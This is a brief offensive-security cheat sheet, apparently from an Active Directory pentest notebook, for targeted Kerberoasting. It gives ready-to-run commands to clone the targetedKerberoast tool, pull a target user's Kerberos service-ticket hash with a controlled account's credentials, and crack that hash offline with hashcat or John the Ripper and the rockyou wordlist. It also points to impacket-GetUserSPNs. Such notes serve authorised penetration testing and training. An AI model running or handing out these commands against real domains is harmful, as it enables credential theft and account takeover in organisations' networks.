Privileged user has the ability to write to the ServicePrincipalName attribute of target user

AKA: Kerberoasting

Git clone targetedKerberoast tool:
```
git clone https://github.com/ShutdownRepo/targetedKerberoast
```

Pull hash of vulnerable user using targetedKerberoast:
```
python3 targetedKerberoast.py -v -d [domain] -u [controlled User] -p [password]
```

Crack the pulled hash using hashcat:
```
hashcat -m 13100 -a 0 <hashfile> /usr/share/wordlists/rockyou.txt
```

Crack the pulled hash using JohnTheRipper:
```
john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>
```


Alternatively use impacket-GetUserSPNs to get all kerberoastable users